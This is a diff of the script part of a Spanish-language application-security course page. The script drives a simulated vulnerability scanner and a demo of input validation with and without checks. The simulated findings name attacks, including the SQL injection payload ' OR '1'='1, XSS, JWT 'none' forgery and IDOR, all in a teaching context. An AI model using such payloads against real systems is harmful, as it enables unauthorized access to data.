+      <span class="ch-label">&#8592; Anterior</span>
+      <span class="ch-title">05 &#8212; Docker &amp; Backend Real</span>
     </a>
     <a href="#" class="ch-link">
-      <span class="ch-label">Próximo →</span>
-      <span class="ch-title">07 — Deploy & CI/CD Seguro</span>
+      <span class="ch-label">Pr&#243;ximo &#8594;</span>
+      <span class="ch-title">07 &#8212; Deploy &amp; CI/CD Seguro</span>
     </a>
   </div>
 </footer>
-<div class="footer-copy">CIPHER DOC — Capítulo 06: AppSec Profundo · OWASP · Pydantic · File Upload · Headers · Construido con Claude Pro</div>
+<div class="footer-copy">CIPHER DOC &#8212; Cap&#237;tulo 06: AppSec Profundo &#183; OWASP &#183; Pydantic &#183; File Upload &#183; Headers &#183; Construido con Claude Pro</div>
+
 
 <script>
-// ── Hero canvas: código fuente en lluvia diagonal + bloques de código
+// ── Hero canvas
 const canvas = document.getElementById('hero-canvas');
 const ctx = canvas.getContext('2d');
 function resize(){ canvas.width = canvas.offsetWidth; canvas.height = canvas.offsetHeight; }
-resize(); new ResizeObserver(resize).observe(canvas);
+resize();
+new ResizeObserver(resize).observe(canvas);
 
 const snippets = [
-  '@router.post("/users")', 'Depends(get_current_user)',
-  'field_validator("email")', 'HTTPException(403)',
-  'bcrypt.hashpw()', 'jwt.decode(token, SECRET)',
-  'SELECT * FROM users', 'bleach.clean(html)',
-  'magic.from_buffer()', 'uuid.uuid4()',
-  'verify_ownership()', 'hmac.compare_digest()',
-  'model_dump(exclude_unset=True)', 'safe_path(filename)',
-  'pip-audit --fix', 'allowlist not denylist',
+  '@router.post("/users")', 'field_validator("email")',
+  'HTTPException(403)', 'bcrypt.hashpw()',
+  'jwt.decode(token)', 'verify_ownership()',
+  'bleach.clean(html)', 'magic.from_buffer()',
+  'uuid.uuid4()', 'model_dump(exclude_unset=True)',
+  'safe_path(filename)', 'hmac.compare_digest()',
+  'allowlist not denylist', 'pip-audit --fix',
+  'Depends(get_current_user)', 'nosniff',
 ];
-const particles = Array.from({length: 22}, (_, i) => ({
-  x: Math.random() * 100, y: Math.random() * 100,
-  speed: 0.03 + Math.random() * 0.04,
+
+const particles = Array.from({length: 20}, (_, i) => ({
+  x: Math.random() * 100,
+  y: Math.random() * 100,
+  speed: 0.025 + Math.random() * 0.035,
   text: snippets[i % snippets.length],
-  alpha: 0.04 + Math.random() * 0.1,
-  size: 9 + Math.random() * 4,
+  alpha: 0.04 + Math.random() * 0.09,
+  size: 9 + Math.random() * 3,
 }));
 
 function drawHero(){
   if(!canvas.width) return requestAnimationFrame(drawHero);
-  ctx.clearRect(0,0,canvas.width,canvas.height);
-  ctx.font = `${particles[0].size}px 'Share Tech Mono'`;
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+  // grid
+  ctx.strokeStyle = 'rgba(255,107,26,0.025)';
+  ctx.lineWidth = 0.5;
+  for(let x = 0; x < canvas.width; x += 50){
+    ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,canvas.height); ctx.stroke();
+  }
+  for(let y = 0; y < canvas.height; y += 50){
+    ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(canvas.width,y); ctx.stroke();
+  }
 
   particles.forEach(p => {
     const x = (p.x / 100) * canvas.width;
@@ -1548,22 +1386,9 @@ function drawHero(){
     ctx.font = `${p.size}px 'Share Tech Mono'`;
     ctx.fillStyle = `rgba(255,107,26,${p.alpha})`;
     ctx.fillText(p.text, x, y);
-
-    // gradient accent
-    if(Math.random() > 0.995) p.alpha = 0.04 + Math.random() * 0.12;
     p.y += p.speed;
     if(p.y > 105) p.y = -5;
   });
-
-  // grid overlay
-  ctx.strokeStyle = 'rgba(255,107,26,0.025)';
-  ctx.lineWidth = 0.5;
-  for(let x=0; x<canvas.width; x+=50){
-    ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,canvas.height); ctx.stroke();
-  }
-  for(let y=0; y<canvas.height; y+=50){
-    ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(canvas.width,y); ctx.stroke();
-  }
   requestAnimationFrame(drawHero);
 }
 drawHero();
@@ -1584,47 +1409,47 @@ document.querySelectorAll('.code-tab').forEach(tab => {
     document.querySelectorAll('.code-tab').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.code-pane').forEach(p => p.classList.remove('active'));
     tab.classList.add('active');
-    document.getElementById('aptab-' + tab.dataset.aptab).classList.add('active');
+    document.getElementById('ct-' + tab.dataset.ct).classList.add('active');
   });
 });
 
-// ── Scanner simulation
-const scanSets = {
+// ── Scanner
+const scanData = {
   passive: [
-    {dot:'fd-crit', sev:'fs-c', text:'[CRIT] /docs expuesto — todos los endpoints visibles públicamente'},
-    {dot:'fd-crit', sev:'fs-c', text:'[CRIT] Puerto 8000 accesible externamente — Uvicorn sin proxy'},
-    {dot:'fd-high', sev:'fs-h', text:'[HIGH] Header "Server: uvicorn/0.29.0" revela stack tecnológico'},
-    {dot:'fd-high', sev:'fs-h', text:'[HIGH] No se detecta HSTS — posible SSL stripping'},
-    {dot:'fd-med', sev:'fs-m', text:'[MED] X-Frame-Options ausente — riesgo de clickjacking'},
-    {dot:'fd-ok', sev:'fs-ok', text:'[OK] HTTPS activo en :443'},
-    {dot:'fd-ok', sev:'fs-ok', text:'[OK] Certificado TLS válido — expira en 87 días'},
+    {dot:'fd-c',sev:'fs-c',text:'[CRIT] /docs expuesto — todos los endpoints visibles públicamente'},
+    {dot:'fd-c',sev:'fs-c',text:'[CRIT] Puerto 8000 accesible externamente — Uvicorn sin proxy'},
+    {dot:'fd-h',sev:'fs-h',text:'[HIGH] Header "Server: uvicorn/0.29.0" revela stack tecnológico'},
+    {dot:'fd-h',sev:'fs-h',text:'[HIGH] No se detecta HSTS — SSL stripping posible'},
+    {dot:'fd-m',sev:'fs-m',text:'[MED] X-Frame-Options ausente — riesgo de clickjacking'},
+    {dot:'fd-ok',sev:'fs-ok',text:'[OK] HTTPS activo en :443'},
+    {dot:'fd-ok',sev:'fs-ok',text:'[OK] Certificado TLS válido — expira en 87 días'},
   ],
   auth: [
-    {dot:'fd-crit', sev:'fs-c', text:'[CRIT] Sin rate limiting en /auth/login — brute force posible'},
-    {dot:'fd-crit', sev:'fs-c', text:'[CRIT] JWT acepta algoritmo "none" — token forgery'},
-    {dot:'fd-high', sev:'fs-h', text:'[HIGH] Token sin campo "exp" — no expira nunca'},
-    {dot:'fd-high', sev:'fs-h', text:'[HIGH] SECRET_KEY < 128 bits detectada en headers'},
-    {dot:'fd-med', sev:'fs-m', text:'[MED] Sin Account lockout tras intentos fallidos'},
-    {dot:'fd-ok', sev:'fs-ok', text:'[OK] bcrypt detectado en respuestas de timing'},
-    {dot:'fd-ok', sev:'fs-ok', text:'[OK] HTTPS en todos los endpoints de auth'},
+    {dot:'fd-c',sev:'fs-c',text:'[CRIT] Sin rate limiting en /auth/login — brute force posible'},
+    {dot:'fd-c',sev:'fs-c',text:'[CRIT] JWT acepta algoritmo "none" — token forgery'},
+    {dot:'fd-h',sev:'fs-h',text:'[HIGH] Token sin campo "exp" — no expira nunca'},
+    {dot:'fd-h',sev:'fs-h',text:'[HIGH] SECRET_KEY menor a 128 bits'},
+    {dot:'fd-m',sev:'fs-m',text:'[MED] Sin account lockout tras intentos fallidos'},
+    {dot:'fd-ok',sev:'fs-ok',text:'[OK] bcrypt detectado por análisis de timing'},
+    {dot:'fd-ok',sev:'fs-ok',text:'[OK] HTTPS en todos los endpoints de auth'},
   ],
   injection: [
-    {dot:'fd-crit', sev:'fs-c', text:"[CRIT] SQL Injection en ?q= — payload: ' OR '1'='1"},
-    {dot:'fd-crit', sev:'fs-c', text:'[CRIT] Error de PostgreSQL expuesto en response body'},
-    {dot:'fd-high', sev:'fs-h', text:'[HIGH] IDOR en /users/{id} — acceso a usuarios ajenos'},
-    {dot:'fd-high', sev:'fs-h', text:"[HIGH] XSS reflectado en /search?name= con payload <script>"},
-    {dot:'fd-med', sev:'fs-m', text:'[MED] Path traversal en /files?name= — bloqueado por OS'},
-    {dot:'fd-ok', sev:'fs-ok', text:'[OK] Pydantic rechaza inputs > max_length'},
-    {dot:'fd-ok', sev:'fs-ok', text:'[OK] Content-Type validado en POST endpoints'},
+    {dot:'fd-c',sev:'fs-c',text:"[CRIT] SQL Injection en ?q= — payload: ' OR '1'='1"},
+    {dot:'fd-c',sev:'fs-c',text:'[CRIT] Error de PostgreSQL expuesto en response body'},
+    {dot:'fd-h',sev:'fs-h',text:'[HIGH] IDOR en /users/{id} — acceso a usuarios ajenos'},
+    {dot:'fd-h',sev:'fs-h',text:'[HIGH] XSS reflejado en ?name= detectado'},
+    {dot:'fd-m',sev:'fs-m',text:'[MED] Path traversal en ?name= — parcialmente bloqueado'},
+    {dot:'fd-ok',sev:'fs-ok',text:'[OK] Pydantic rechaza inputs > max_length'},
+    {dot:'fd-ok',sev:'fs-ok',text:'[OK] Content-Type validado en POST endpoints'},
   ],
   headers: [
-    {dot:'fd-crit', sev:'fs-c', text:'[CRIT] Content-Security-Policy ausente — XSS sin mitigación'},
-    {dot:'fd-high', sev:'fs-h', text:'[HIGH] X-Content-Type-Options ausente — MIME sniffing posible'},
-    {dot:'fd-high', sev:'fs-h', text:'[HIGH] Referrer-Policy no configurado — data leakage'},
-    {dot:'fd-med', sev:'fs-m', text:'[MED] Permissions-Policy ausente — acceso a APIs del navegador'},
-    {dot:'fd-med', sev:'fs-m', text:'[MED] CORS: Access-Control-Allow-Origin: *'},
-    {dot:'fd-ok', sev:'fs-ok', text:'[OK] X-Frame-Options: DENY presente'},
-    {dot:'fd-ok', sev:'fs-ok', text:'[OK] HSTS con max-age=31536000 detectado'},
+    {dot:'fd-c',sev:'fs-c',text:'[CRIT] Content-Security-Policy ausente'},
+    {dot:'fd-h',sev:'fs-h',text:'[HIGH] X-Content-Type-Options ausente — MIME sniffing posible'},
+    {dot:'fd-h',sev:'fs-h',text:'[HIGH] Referrer-Policy no configurado'},
+    {dot:'fd-m',sev:'fs-m',text:'[MED] Permissions-Policy ausente'},
+    {dot:'fd-m',sev:'fs-m',text:'[MED] CORS: Access-Control-Allow-Origin: *'},
+    {dot:'fd-ok',sev:'fs-ok',text:'[OK] X-Frame-Options: DENY presente'},
+    {dot:'fd-ok',sev:'fs-ok',text:'[OK] HSTS con max-age=31536000 detectado'},
   ],
 };
 
@@ -1633,89 +1458,83 @@ async function runScan(){
   if(scanning) return;
   scanning = true;
   const mode = document.getElementById('scan-mode').value;
-  const resultsEl = document.getElementById('scan-results');
-  const statusEl = document.getElementById('scan-status-text');
-
-  resultsEl.innerHTML = '';
-  statusEl.textContent = 'Escaneando...';
-  statusEl.style.color = 'var(--yellow)';
-
-  const findings = scanSets[mode];
-  for(let i=0; i<findings.length; i++){
-    await new Promise(r => setTimeout(r, 320 + Math.random()*200));
-    const f = findings[i];
-    const div = document.createElement('div');
-    div.className = 'scan-finding';
-    div.innerHTML = `<div class="finding-dot ${f.dot}"></div><span class="finding-text">${f.text}</span><span class="finding-sev ${f.sev}">${f.sev.includes('c')?'CRIT':f.sev.includes('h')?'HIGH':f.sev.includes('m')?'MED':'OK'}</span>`;
-    resultsEl.appendChild(div);
-    resultsEl.scrollTop = resultsEl.scrollHeight;
+  const el = document.getElementById('scan-results');
+  const st = document.getElementById('scan-status-text');
+  el.innerHTML = '';
+  st.textContent = 'Escaneando...';
+  st.style.color = 'var(--yellow)';
+  for(const f of scanData[mode]){
+    await new Promise(r => setTimeout(r, 300 + Math.random()*200));
+    const d = document.createElement('div');
+    d.className = 'scan-finding';
+    const sevLabel = f.sev.includes('c') ? 'CRIT' : f.sev.includes('h') ? 'HIGH' : f.sev.includes('m') ? 'MED' : 'OK';
+    d.innerHTML = '<div class="finding-dot ' + f.dot + '"></div>'
+      + '<span class="finding-text">' + f.text + '</span>'
+      + '<span class="finding-sev ' + f.sev + '">' + sevLabel + '</span>';
+    el.appendChild(d);
+    el.scrollTop = el.scrollHeight;
   }
-  statusEl.textContent = `Completo — ${findings.length} hallazgos`;
-  statusEl.style.color = 'var(--green)';
+  st.textContent = 'Completo — ' + scanData[mode].length + ' hallazgos';
+  st.style.color = 'var(--green)';
   scanning = false;
 }
 
-// ── Input playground
+// ── Playground
 function testUnsafe(){
-  const email = document.getElementById('unsafe-email').value;
-  const user = document.getElementById('unsafe-user').value;
-  const age = document.getElementById('unsafe-age').value;
-  document.getElementById('unsafe-email-result').textContent = `→ Se pasa al ORM: "${email}" (sin validar)`;
-  document.getElementById('unsafe-user-result').textContent = `→ Se pasa al ORM: "${user}" ← PELIGROSO`;
-  document.getElementById('unsafe-age-result').textContent = `→ Se pasa al ORM: ${age} (sin restricciones)`;
+  const e = document.getElementById('unsafe-email').value;
+  const u = document.getElementById('unsafe-user').value;
+  const a = document.getElementById('unsafe-age').value;
+  document.getElementById('r-ue').textContent = '→ Pasa al ORM: "' + e + '" (sin validar)';
+  document.getElementById('r-uu').textContent = '→ Pasa al ORM: "' + u + '" ← PELIGROSO';
+  document.getElementById('r-ua').textContent = '→ Pasa al ORM: ' + a + ' (sin restricciones)';
 }
 
 function testSafe(){
-  const emailEl = document.getElementById('safe-email');
-  const userEl = document.getElementById('safe-user');
-  const ageEl = document.getElementById('safe-age');
-
-  const emailRes = document.getElementById('safe-email-result');
-  const userRes = document.getElementById('safe-user-result');
-  const ageRes = document.getElementById('safe-age-result');
-
-  // Email validation
   const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  if(emailRe.test(emailEl.value)){
-    emailRes.className = 'pg-result safe-ok';
-    emailRes.textContent = `✓ Email válido — pasa a la base de datos`;
+  const userRe  = /^[a-zA-Z0-9_-]{3,50}$/;
+
+  const eVal = document.getElementById('safe-email').value;
+  const uVal = document.getElementById('safe-user').value;
+  const aVal = parseInt(document.getElementById('safe-age').value);
+
+  const eEl = document.getElementById('r-se');
+  if(emailRe.test(eVal)){
+    eEl.className = 'pg-result safe-ok';
+    eEl.textContent = '✓ Email válido — pasa a la DB';
   } else {
-    emailRes.className = 'pg-result danger';
-    emailRes.textContent = `✗ ValidationError: value is not a valid email address`;
+    eEl.className = 'pg-result danger';
+    eEl.textContent = '✗ ValidationError: value is not a valid email address';
   }
 
-  // Username validation
-  const userRe = /^[a-zA-Z0-9_-]{3,50}$/;
-  if(userRe.test(userEl.value)){
-    userRes.className = 'pg-result safe-ok';
-    userRes.textContent = `✓ Username válido — pasa a la base de datos`;
+  const uEl = document.getElementById('r-su');
+  if(userRe.test(uVal)){
+    uEl.className = 'pg-result safe-ok';
+    uEl.textContent = '✓ Username válido — pasa a la DB';
   } else {
-    userRes.className = 'pg-result danger';
-    userRes.textContent = `✗ ValidationError: string does not match pattern ^[a-zA-Z0-9_-]+$`;
+    uEl.className = 'pg-result danger';
+    uEl.textContent = '✗ ValidationError: string does not match pattern';
   }
 
-  // Age validation
-  const age = parseInt(ageEl.value);
-  if(!isNaN(age) && age >= 1 && age <= 120){
-    ageRes.className = 'pg-result safe-ok';
-    ageRes.textContent = `✓ Age válido (${age}) — pasa a la base de datos`;
+  const aEl = document.getElementById('r-sa');
+  if(!isNaN(aVal) && aVal >= 1 && aVal <= 120){
+    aEl.className = 'pg-result safe-ok';
+    aEl.textContent = '✓ Age válido (' + aVal + ') — pasa a la DB';
   } else {
-    ageRes.className = 'pg-result danger';
-    ageRes.textContent = `✗ ValidationError: ensure this value is greater than or equal to 1`;
+    aEl.className = 'pg-result danger';
+    aEl.textContent = '✗ ValidationError: ensure this value is >= 1 and <= 120';
   }
 }
-
-// Initialize playgrounds
 testUnsafe(); testSafe();
 
-// ── Scroll
+// ── Scroll observer
 const obs = new IntersectionObserver(entries => {
   entries.forEach(e => { if(e.isIntersecting) e.target.classList.add('visible'); });
 }, { threshold: 0.07, rootMargin: '0px 0px -40px 0px' });
-document.querySelectorAll('.fade-in').forEach((el,i) => {
-  el.style.transitionDelay = `${(i%5)*0.07}s`;
+document.querySelectorAll('.fade-in').forEach((el, i) => {
+  el.style.transitionDelay = (i % 5) * 0.07 + 's';
   obs.observe(el);
 });
 </script>
+
 </body>
 </html>
